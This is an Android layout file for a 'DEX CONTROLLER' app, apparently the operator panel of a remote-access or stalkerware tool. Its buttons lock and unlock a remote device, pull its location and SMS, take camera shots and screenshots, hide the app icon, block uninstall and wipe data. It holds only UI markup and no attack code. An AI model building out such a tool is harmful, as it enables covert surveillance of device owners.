<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:app="http://schemas.android.com/apk/res-auto"
    xmlns:tools="http://schemas.android.com/tools"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:orientation="vertical"
    android:background="@color/surface"
    tools:context=".MainActivity">

    <!-- HEADER -->
    <LinearLayout
        android:id="@+id/headerLayout"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:orientation="vertical"
        android:paddingHorizontal="24dp"
        android:paddingTop="20dp"
        android:paddingBottom="10dp">

        <TextView
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:text="DEX CONTROLLER"
            android:textColor="@color/primary"
            android:textSize="20sp"
            android:letterSpacing="0.1"
            android:fontFamily="sans-serif-black"/>

        <com.google.android.material.card.MaterialCardView
            android:layout_width="match_parent"
            android:layout_height="48dp"
            android:layout_marginTop="12dp"
            app:cardCornerRadius="16dp"
            app:cardElevation="0dp"
            app:cardBackgroundColor="@color/surfaceVariant"
            app:strokeWidth="1dp"
            app:strokeColor="#1AFFFFFF">

            <LinearLayout
                android:layout_width="match_parent"
                android:layout_height="match_parent"
                android:gravity="center_vertical"
                android:paddingHorizontal="16dp">

                <View
                    android:id="@+id/statusIndicator"
                    android:layout_width="8dp"
                    android:layout_height="8dp"
                    android:background="@drawable/status_dot"/>

                <Spinner
                    android:id="@+id/deviceSpinner"
                    android:layout_width="0dp"
                    android:layout_height="match_parent"
                    android:layout_weight="1"
                    android:layout_marginStart="8dp"
                    android:background="@null"
                    android:overlapAnchor="false"
                    android:spinnerMode="dropdown"/>

                <TextView
                    android:id="@+id/statusText"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:text="OFFLINE"
                    android:textColor="@color/onSurfaceVariant"
                    android:textSize="11sp"
                    android:letterSpacing="0.05"
                    android:fontFamily="sans-serif-medium"/>
            </LinearLayout>
        </com.google.android.material.card.MaterialCardView>
    </LinearLayout>

    <com.google.android.material.tabs.TabLayout
        android:id="@+id/tabLayout"
        android:layout_width="match_parent"
        android:layout_height="48dp"
        android:background="@color/surface"
        app:tabIndicatorHeight="2dp"
        app:tabIndicatorFullWidth="false"
        app:tabIndicatorColor="@color/primary"
        app:tabSelectedTextColor="@color/primary"
        app:tabTextColor="@color/onSurfaceVariant"
        app:tabRippleColor="@android:color/transparent"
        app:tabTextAppearance="@style/CustomTabText"
        app:tabIndicatorGravity="bottom">
        <com.google.android.material.tabs.TabItem android:text="CONTROL"/>
        <com.google.android.material.tabs.TabItem android:text="CAMERA"/>
        <com.google.android.material.tabs.TabItem android:text="SYSTEM"/>
    </com.google.android.material.tabs.TabLayout>

    <!-- CONTENT AREA -->
    <FrameLayout
        android:id="@+id/contentFrame"
        android:layout_width="match_parent"
        android:layout_height="0dp"
        android:layout_weight="1"
        android:padding="16dp">

        <!-- TAB CONTROL -->
        <LinearLayout
            android:id="@+id/tab_control"
            android:layout_width="match_parent"
            android:layout_height="match_parent"
            android:orientation="vertical"
            android:visibility="visible">

            <com.google.android.material.card.MaterialCardView
                android:id="@+id/cardConsole"
                android:layout_width="match_parent"
                android:layout_height="0dp"
                android:layout_weight="1"
                app:cardCornerRadius="20dp"
                app:cardElevation="0dp"
                app:cardBackgroundColor="@color/surfaceVariant"
                app:strokeWidth="1dp"
                app:strokeColor="#0DFFFFFF">

                <ScrollView
                    android:id="@+id/logScroll"
                    android:layout_width="match_parent"
                    android:layout_height="match_parent"
                    android:padding="12dp">
                    <TextView
                        android:id="@+id/logText"
                        android:layout_width="match_parent"
                        android:layout_height="wrap_content"
                        android:text="System initialized..."
                        android:textSize="11sp"
                        android:fontFamily="monospace"
                        android:textColor="@color/onSurfaceVariant"/>
                </ScrollView>
            </com.google.android.material.card.MaterialCardView>

            <GridLayout
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:layout_marginTop="12dp"
                android:columnCount="2">

                <com.google.android.material.button.MaterialButton
                    android:id="@+id/btnLock"
                    style="@style/AncientButton"
                    android:layout_width="0dp"
                    android:layout_height="54dp"
                    android:layout_columnWeight="1"
                    android:layout_margin="4dp"
                    android:text="Lock"
                    android:textSize="11sp"
                    app:iconPadding="4dp"
                    app:iconSize="18dp"
                    app:icon="@android:drawable/ic_lock_lock"/>

                <com.google.android.material.button.MaterialButton
                    android:id="@+id/btnUnlock"
                    style="@style/AncientButton"
                    android:layout_width="0dp"
                    android:layout_height="54dp"
                    android:layout_columnWeight="1"
                    android:layout_margin="4dp"
                    android:text="Unlock"
                    android:textSize="11sp"
                    app:iconPadding="4dp"
                    app:iconSize="13dp"
                    app:icon="@android:drawable/ic_partial_secure"/>

                <com.google.android.material.button.MaterialButton
                    android:id="@+id/btnLocation"
                    style="@style/AncientButton"
                    android:layout_width="0dp"
                    android:layout_height="54dp"
                    android:layout_columnWeight="1"
                    android:layout_margin="4dp"
                    android:text="Location"
                    android:textSize="11sp"
                    app:iconPadding="4dp"
                    app:iconSize="18dp"
                    app:icon="@android:drawable/ic_menu_mylocation"/>

                <com.google.android.material.button.MaterialButton
                    android:id="@+id/btnSMS"
                    style="@style/AncientButton"
                    android:layout_width="0dp"
                    android:layout_height="54dp"
                    android:layout_columnWeight="1"
                    android:layout_margin="4dp"
                    android:text="SMS"
                    android:textSize="11sp"
                    app:iconPadding="4dp"
                    app:iconSize="16dp"
                    app:icon="@android:drawable/sym_action_chat"/>

                <com.google.android.material.button.MaterialButton
                    android:id="@+id/btnAntiUninstall"
                    style="@style/AncientButton"
                    android:layout_width="0dp"
                    android:layout_height="54dp"
                    android:layout_columnSpan="2"
                    android:layout_columnWeight="2"
                    android:layout_margin="4dp"
                    android:text="Anti-Uninstall: OFF"
                    android:textSize="11sp"
                    app:iconPadding="4dp"
                    app:iconSize="18dp"
                    app:icon="@android:drawable/ic_lock_power_off"/>
            </GridLayout>
        </LinearLayout>

        <!-- TAB CAMERA -->
        <LinearLayout
            android:id="@+id/tab_media"
            android:layout_width="match_parent"
            android:layout_height="match_parent"
            android:orientation="vertical"
            android:visibility="gone">

            <com.google.android.material.card.MaterialCardView
                android:id="@+id/cardLiveFeed"
                android:layout_width="match_parent"
                android:layout_height="0dp"
                android:layout_weight="1"
                app:cardCornerRadius="20dp"
                app:cardElevation="0dp"
                app:cardBackgroundColor="@color/black"
                android:visibility="gone">

                <RelativeLayout
                    android:layout_width="match_parent"
                    android:layout_height="match_parent">
                    <ImageView
                        android:id="@+id/liveView"
                        android:layout_width="match_parent"
                        android:layout_height="match_parent"
                        android:scaleType="fitCenter"/>

                    <TextView
                        android:id="@+id/placeholder"
                        android:layout_width="wrap_content"
                        android:layout_height="wrap_content"
                        android:layout_centerInParent="true"
                        android:text="NO SIGNAL"
                        android:textColor="#33FFFFFF"
                        android:textSize="12sp"/>

                    <LinearLayout
                        android:layout_width="wrap_content"
                        android:layout_height="wrap_content"
                        android:layout_alignParentEnd="true"
                        android:layout_alignParentBottom="true"
                        android:layout_margin="12dp"
                        android:orientation="horizontal"
                        android:gravity="center">

                        <com.google.android.material.button.MaterialButton
                            android:id="@+id/btnDeleteImg"
                            android:layout_width="42dp"
                            android:layout_height="42dp"
                            android:layout_marginEnd="8dp"
                            app:icon="@android:drawable/ic_menu_delete"
                            app:iconTint="@color/white"
                            app:backgroundTint="#B3000000"
                            app:iconSize="20dp"
                            app:cornerRadius="12dp"
                            android:padding="0dp"
                            android:insetLeft="0dp"
                            android:insetTop="0dp"
                            android:insetRight="0dp"
                            android:insetBottom="0dp"
                            android:minWidth="0dp"
                            android:minHeight="0dp"
                            app:iconPadding="0dp"
                            app:iconGravity="textStart"
                            android:gravity="center"/>

                        <com.google.android.material.button.MaterialButton
                            android:id="@+id/btnSaveImg"
                            android:layout_width="42dp"
                            android:layout_height="42dp"
                            android:layout_marginEnd="8dp"
                            app:icon="@android:drawable/ic_menu_save"
                            app:iconTint="@color/white"
                            app:backgroundTint="#B3000000"
                            app:iconSize="20dp"
                            app:cornerRadius="12dp"
                            android:padding="0dp"
                            android:insetLeft="0dp"
                            android:insetTop="0dp"
                            android:insetRight="0dp"
                            android:insetBottom="0dp"
                            android:minWidth="0dp"
                            android:minHeight="0dp"
                            app:iconPadding="0dp"
                            app:iconGravity="textStart"
                            android:gravity="center"/>

                        <com.google.android.material.button.MaterialButton
                            android:id="@+id/btnRotate"
                            android:layout_width="42dp"
                            android:layout_height="42dp"
                            app:icon="@android:drawable/ic_menu_rotate"
                            app:iconTint="@color/white"
                            app:backgroundTint="#B3000000"
                            app:iconSize="20dp"
                            app:cornerRadius="12dp"
                            android:padding="0dp"
                            android:insetLeft="0dp"
                            android:insetTop="0dp"
                            android:insetRight="0dp"
                            android:insetBottom="0dp"
                            android:minWidth="0dp"
                            android:minHeight="0dp"
                            app:iconPadding="0dp"
                            app:iconGravity="textStart"
                            android:gravity="center"/>
                    </LinearLayout>
                </RelativeLayout>
            </com.google.android.material.card.MaterialCardView>

            <GridLayout
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:layout_marginTop="8dp"
                android:columnCount="2">

                <com.google.android.material.button.MaterialButton
                    android:id="@+id/btnScreenshot"
                    style="@style/AncientButton"
                    android:layout_width="match_parent"
                    android:layout_height="54dp"
                    android:layout_columnSpan="2"
                    android:layout_margin="4dp"
                    android:text="Take Screenshot"
                    android:textSize="11sp"
                    app:iconPadding="4dp"
                    app:iconSize="18dp"
                    app:icon="@android:drawable/ic_menu_camera"/>

                <com.google.android.material.button.MaterialButton
                    android:id="@+id/btnFrontCam"
                    style="@style/AncientButton"
                    android:layout_width="0dp"
                    android:layout_height="54dp"
                    android:layout_columnWeight="1"
                    android:layout_margin="4dp"
                    android:text="Front Cam"
                    android:textSize="11sp"
                    app:iconPadding="4dp"
                    app:iconSize="18dp"
                    app:icon="@android:drawable/ic_menu_camera"/>

                <com.google.android.material.button.MaterialButton
                    android:id="@+id/btnBackCam"
                    style="@style/AncientButton"
                    android:layout_width="0dp"
                    android:layout_height="54dp"
                    android:layout_columnWeight="1"
                    android:layout_margin="4dp"
                    android:text="Rear Cam"
                    android:textSize="11sp"
                    app:iconPadding="4dp"
                    app:iconSize="18dp"
                    app:icon="@android:drawable/ic_menu_camera"/>
            </GridLayout>
        </LinearLayout>

        <!-- TAB SYSTEM -->
        <LinearLayout
            android:id="@+id/tab_system"
            android:layout_width="match_parent"
            android:layout_height="match_parent"
            android:orientation="vertical"
            android:visibility="gone">

            <com.google.android.material.card.MaterialCardView
                android:layout_width="match_parent"
                android:layout_height="0dp"
                android:layout_weight="1"
                app:cardCornerRadius="20dp"
                app:cardElevation="0dp"
                app:cardBackgroundColor="@color/surfaceVariant"
                app:strokeWidth="1dp"
                app:strokeColor="#1AFFFFFF">

                <LinearLayout
                    android:layout_width="match_parent"
                    android:layout_height="match_parent"
                    android:orientation="vertical"
                    android:padding="16dp">

                    <TextView
                        android:layout_width="wrap_content"
                        android:layout_height="wrap_content"
                        android:text="DEVICE STATUS"
                        android:textColor="@color/primary"
                        android:textSize="11sp"
                        android:letterSpacing="0.1"
                        android:fontFamily="sans-serif-black"/>

                    <TextView
                        android:id="@+id/txtDeviceInfo"
                        android:layout_width="match_parent"
                        android:layout_height="match_parent"
                        android:layout_marginTop="8dp"
                        android:text="No info."
                        android:textColor="@color/onSurfaceVariant"
                        android:textSize="11sp"
                        android:fontFamily="monospace"/>
                </LinearLayout>
            </com.google.android.material.card.MaterialCardView>

            <LinearLayout
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:layout_marginTop="12dp"
                android:orientation="vertical">

                <com.google.android.material.button.MaterialButton
                    android:id="@+id/btnCheckPerms"
                    style="@style/AncientButton"
                    android:layout_width="match_parent"
                    android:layout_height="54dp"
                    android:layout_margin="4dp"
                    android:text="Check Permissions"
                    android:textSize="11sp"
                    app:iconPadding="4dp"
                    app:iconSize="18dp"
                    app:icon="@android:drawable/ic_menu_agenda"/>

                <com.google.android.material.button.MaterialButton
                    android:id="@+id/btnHideIcon"
                    style="@style/AncientButton"
                    android:layout_width="match_parent"
                    android:layout_height="54dp"
                    android:layout_margin="4dp"
                    android:text="Hide Icon: OFF"
                    android:textSize="11sp"
                    app:iconPadding="4dp"
                    app:iconSize="18dp"
                    app:icon="@android:drawable/ic_menu_view"/>

                <com.google.android.material.button.MaterialButton
                    android:id="@+id/btnWipe"
                    style="@style/AncientButton"
                    android:layout_width="match_parent"
                    android:layout_height="54dp"
                    android:layout_margin="4dp"
                    android:text="Wipe Data"
                    android:textSize="11sp"
                    android:textColor="@color/error"
                    app:iconTint="@color/error"
                    app:iconPadding="4dp"
                    app:iconSize="18dp"
                    app:icon="@android:drawable/ic_menu_delete"/>
            </LinearLayout>
        </LinearLayout>
    </FrameLayout>

</LinearLayout>
